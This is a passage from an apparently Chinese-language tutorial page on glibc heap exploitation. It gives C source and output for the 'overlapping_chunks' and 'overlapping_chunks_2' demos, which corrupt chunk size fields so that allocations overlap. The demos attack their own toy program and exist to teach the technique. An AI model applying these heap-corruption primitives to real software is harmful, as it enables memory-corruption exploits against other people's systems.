</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=sc>&#39;4&#39;</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>And if we then memset(p3,&#39;3&#39;, 80), we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;3&#39;</span><span class=p>,</span> <span class=mi>80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This is a simple chunks overlapping problem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s start to allocate 3 chunks on the heap
</span></span><span class=line><span class=cl>The 3 chunks have been allocated here:
</span></span><span class=line><span class=cl>p1=0x1b9a010
</span></span><span class=line><span class=cl>p2=0x1b9a110
</span></span><span class=line><span class=cl>p3=0x1b9a210
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now let&#39;s free the chunk p2
</span></span><span class=line><span class=cl>The chunk p2 is now in the unsorted bin ready to serve possible
</span></span><span class=line><span class=cl>new malloc() of its size
</span></span><span class=line><span class=cl>Now let&#39;s simulate an overflow that can overwrite the size of the
</span></span><span class=line><span class=cl>chunk freed p2.
</span></span><span class=line><span class=cl>For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
</span></span><span class=line><span class=cl>To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
</span></span><span class=line><span class=cl>We are going to set the size of chunk p2 to to 385, which gives us
</span></span><span class=line><span class=cl>a region size of 376
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now let&#39;s allocate another chunk with a size equal to the data
</span></span><span class=line><span class=cl>size of the chunk p2 injected size
</span></span><span class=line><span class=cl>This malloc will be served from the previously freed chunk that
</span></span><span class=line><span class=cl>is parked in the unsorted bin which size has been modified by us
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p4 has been allocated at 0x1b9a110 and ends at 0x1b9a288
</span></span><span class=line><span class=cl>p3 starts at 0x1b9a210 and ends at 0x1b9a288
</span></span><span class=line><span class=cl>p4 should overlap with p3, in this case p4 includes all p3.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now everything copied inside chunk p4 can overwrites data on
</span></span><span class=line><span class=cl>chunk p3, and data written to chunk p3 can overwrite data
</span></span><span class=line><span class=cl>stored in the p4 chunk.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s run through an example. Right now, we have:
</span></span><span class=line><span class=cl>p4 = xK�8�
</span></span><span class=line><span class=cl>p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>If we memset(p4,&#39;4&#39;, 376), we have:
</span></span><span class=line><span class=cl>p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
</span></span><span class=line><span class=cl>p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>And if we then memset(p3,&#39;3&#39;, 80), we have:
</span></span><span class=line><span class=cl>p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
</span></span><span class=line><span class=cl>p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
</span></span></code></pre></td></tr></table></div></div><p>源程序和输出结果里已经相当清晰了，这里就是修改了一个 unsorted bin 中的 free chunk 的 <code>chunk_size</code>，然后把它申请回来，这样它的一部分就和原本紧挨在下面的 chunk 重叠了，那么向它的这部分写入数据就会影响到下面的这个 chunk，反之亦然。</p><h2 id=overlapping_chunks_2>overlapping_chunks_2</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> Yet another simple tale of overlapping chunk.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span><span class=o>*</span><span class=n>p2</span><span class=p>,</span><span class=o>*</span><span class=n>p3</span><span class=p>,</span><span class=o>*</span><span class=n>p4</span><span class=p>,</span><span class=o>*</span><span class=n>p5</span><span class=p>,</span><span class=o>*</span><span class=n>p6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>real_size_p1</span><span class=p>,</span><span class=n>real_size_p2</span><span class=p>,</span><span class=n>real_size_p3</span><span class=p>,</span><span class=n>real_size_p4</span><span class=p>,</span><span class=n>real_size_p5</span><span class=p>,</span><span class=n>real_size_p6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>prev_in_use</span> <span class=o>=</span> <span class=mh>0x1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is a simple chunks overlapping problem&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s start to allocate 5 chunks on the heap:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p4</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p5</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p1</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p2</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p3</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p4</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p5</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>chunk p1 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span><span class=o>+</span><span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p2 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p2</span><span class=o>+</span><span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p3 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=o>+</span><span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p3</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p4 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p4</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=o>+</span><span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p4</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p5 from %p to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p5</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p5</span><span class=o>+</span><span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p5</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=sc>&#39;A&#39;</span><span class=p>,</span><span class=n>real_size_p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=sc>&#39;B&#39;</span><span class=p>,</span><span class=n>real_size_p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;C&#39;</span><span class=p>,</span><span class=n>real_size_p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=sc>&#39;D&#39;</span><span class=p>,</span><span class=n>real_size_p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p5</span><span class=p>,</span><span class=sc>&#39;E&#39;</span><span class=p>,</span><span class=n>real_size_p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s free the chunk p4.</span><span class=se>\n</span><span class=s>In this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><span class=se>\n</span><span class=s>with the size of chunk_p2 + size of chunk_p3</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=n>real_size_p1</span> <span class=p>)</span> <span class=o>=</span> <span class=n>real_size_p2</span> <span class=o>+</span> <span class=n>real_size_p3</span> <span class=o>+</span> <span class=n>prev_in_use</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>//&lt;--- BUG HERE
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now during the free() operation on p2, the allocator is fooled to think that </span><span class=se>\n</span><span class=s>the nextchunk is p4 (since p2 + size_p2 now point to p4) </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This operation will basically create a big free chunk that wrongly includes p3</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>p6</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>2000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p6</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and </span><span class=se>\n</span><span class=s>we can overwrite data in p3 by writing on chunk p6</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p6 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p6</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p6</span><span class=o>+</span><span class=n>real_size_p6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p3 from %p to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>p3</span><span class=o>+</span><span class=n>real_size_p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Data inside chunk p3: </span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s write something inside p6</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>p6</span><span class=p>,</span><span class=sc>&#39;F&#39;</span><span class=p>,</span><span class=mi>1500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Data inside chunk p3: </span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This is a simple chunks overlapping problem
</span></span><span class=line><span class=cl>This is also referenced as Nonadjacent Free Chunk Consolidation Attack
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s start to allocate 5 chunks on the heap:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chunk p1 from 0x17c9010 to 0x17c93f8
</span></span><span class=line><span class=cl>chunk p2 from 0x17c9400 to 0x17c97e8
</span></span><span class=line><span class=cl>chunk p3 from 0x17c97f0 to 0x17c9bd8
</span></span><span class=line><span class=cl>chunk p4 from 0x17c9be0 to 0x17c9fc8
</span></span><span class=line><span class=cl>chunk p5 from 0x17c9fd0 to 0x17ca3b8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s free the chunk p4.
</span></span><span class=line><span class=cl>In this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2
</span></span><span class=line><span class=cl>with the size of chunk_p2 + size of chunk_p3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now during the free() operation on p2, the allocator is fooled to think that
</span></span><span class=line><span class=cl>the nextchunk is p4 (since p2 + size_p2 now point to p4)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This operation will basically create a big free chunk that wrongly includes p3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and
</span></span><span class=line><span class=cl>we can overwrite data in p3 by writing on chunk p6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chunk p6 from 0x17c9400 to 0x17c9bd8
</span></span><span class=line><span class=cl>chunk p3 from 0x17c97f0 to 0x17c9bd8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Data inside chunk p3:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s write something inside p6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Data inside chunk p3:
</span></span><span class=line><span class=cl>
